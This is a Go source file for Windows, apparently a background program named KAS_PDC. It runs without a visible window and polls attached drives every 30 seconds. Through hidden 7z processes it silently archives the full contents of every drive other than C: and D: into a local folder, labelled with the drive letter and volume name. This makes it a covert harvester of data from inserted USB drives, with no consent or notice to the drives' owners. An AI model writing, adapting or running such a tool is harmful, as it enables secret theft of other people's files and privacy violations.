package main

import (
	"fmt"
	"os/exec"
	"strings"
	"os"
	// "io"
	// "log"
	"time"
	"math/rand"
	// "path/filepath"
	"syscall"
	// "unsafe"
	"github.com/gonutz/w32/v2"
	"KAS_PDC/drivet"
)

// cd %PDC%\gocode\ && go build -ldflags "-H=windowsgui" -o KAS_PDC.exe main/main.go
// output: KAS_PDC.exe

var pdc string

func main() {
	// hideConsoleWindow()
	for {
	    prog()
	    time.Sleep(time.Second*30)
	}
}

func HideConsoleWindow() {
	console := w32.GetConsoleWindow()
    if console == 0 {
        return
    }
	_, consoleProcID := w32.GetWindowThreadProcessId(console)
    if w32.GetCurrentProcessId() == consoleProcID {
        w32.ShowWindowAsync(console, w32.SW_HIDE)
    }
}

// func prog() {
// 	fmt.Println("readyok")
// 	_out, err := getDeviceIDs()
// 	if err != nil {
// 		fmt.Println(err)
// 	}
// 	out := _out.String()
// 	devices := strings.Split(out, "\n")
// 	devices = devices[1:]
// 	for _,device := range devices {
// 	    fmt.Println(device)
// 	//}
// 	//fmt.Println(out)
// 	//_, e := copy("C:/Users/admin/Documents/PDC_2094/gocode/main.exe", "D:/mains.exe")
// 	//if e != nil {
// 	//	log.Fatal(e)
// 	//}
// 	entries, err := os.ReadDir(device)
// 	if err != nil {
// 		log.Fatal(err)
// 	}


// 		for _, e := range entries {
// 			fmt.Println(e.Name())
// 		}
// 	}
// }

func prog() {
	pdc = os.Getenv("PDC")
	if pdc == "" {
		fmt.Println("Env not set.")
		return
	}
	fmt.Println("readyok")
	_out, err := getDeviceIDs()
	if err != nil {
		fmt.Println(err)
	}
	out := _out.String()
	out = strings.TrimSpace(out)
	devices := strings.Split(out, "\n")
	devices = devices[1:]
	for _, device := range devices {
	    if device != "C:" && device != "D:" {
	        // copy(device + "\\*", "C:\\Users\\admin\\Documents\\PDC_2094\\MagP\\files.zip")
			rand.Seed(time.Now().UnixNano())
			go copy(device + "\\*", fmt.Sprintf("%s\\MagP\\%s_%s.7z", pdc, /*rand.Intn(10000000)*/ strings.Replace(device, ":", "", 1), drivet.GetDriveLabel(device)))
	    }
	}
}

func getDeviceIDs() (strings.Builder, error) {
	cmd := exec.Command("wmic", "logicaldisk", "get", "DeviceID")
	var out strings.Builder
	cmd.Stdout = &out
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	err := cmd.Run()
	return out, err
}

func copy(src, dest string) (string, error) {
	// cmd := exec.Command(os.Getenv("windir") + "\\System32\\cmd.exe", "/C", "start", "/b", "tar", "-cf", dest, src)
	// cmd := exec.Command("tar", "-cf", dest, src)
	cmd := exec.Command("7z", "a", "-mx=0", dest, src, "-xr!D:\\$RECYCLE.BIN", "-xr!D:\\SystemVolumeInformation", "-xr!D:\\cfrbackup*")
	// 7z a -t7z -mx=0 -mmt=on -m0=store .\test.7z "D:\*" -xr!"D:\$RECYCLE.BIN" -xr!"D:\SystemVolumeInformation" -xr!"D:\cfrbackup*"
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	// err := cmd.Run()
	// if err != nil {
	// 	fmt.Println("Error:", err)
	// 	return
	// }

cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	_out, err := cmd.Output()
	out := string(_out)
	return out, err
}

// func copy(src, dest string) {
// 	command := "tar -cf " + dest + " " +  src

//     // Prepare command to run
//     cmd := syscall.StringToUTF16Ptr(command)

//     // Specify process attributes
//     var si syscall.StartupInfo
//     var pi syscall.ProcessInformation
//     si.Cb = uint32(unsafe.Sizeof(si))

//     // Flags to hide window
//     si.Flags = syscall.STARTF_USESHOWWINDOW
//     si.ShowWindow = syscall.SW_HIDE

//     // Create process
//     err := syscall.CreateProcess(nil, cmd, nil, nil, false, 0, nil, nil, &si, &pi)
//     if err != nil {
//         fmt.Println("Error:", err)
//         return
//     }

//     fmt.Println("Process started successfully")
// }

/*func copy(src, dst string) (int64, error) {
        sourceFileStat, err := os.Stat(src)
        if err != nil {
                return 0, err
        }

        if !sourceFileStat.Mode().IsRegular() {
                return 0, fmt.Errorf("%s is not a regular file", src)
        }

        source, err := os.Open(src)
        if err != nil {
                return 0, err
        }
        defer source.Close()

        destination, err := os.Create(dst)
        if err != nil {
                return 0, err
        }
        defer destination.Close()
        nBytes, err := io.Copy(destination, source)
        return nBytes, err
}*/

// func findWindowByPID(pid uint32) w32.HWND {
//     var hwnd w32.HWND
//     callback := func(h w32.HWND, lParam uintptr) uintptr {
//         var procID uint32
//         w32.GetWindowThreadProcessId(h, &procID)
//         if procID == pid {
//             hwnd = h
//             return 0 // Stop enumeration
//         }
//         return 1 // Continue enumeration
//     }

//     w32.EnumWindows(callback, 0)
//     return hwnd
// }
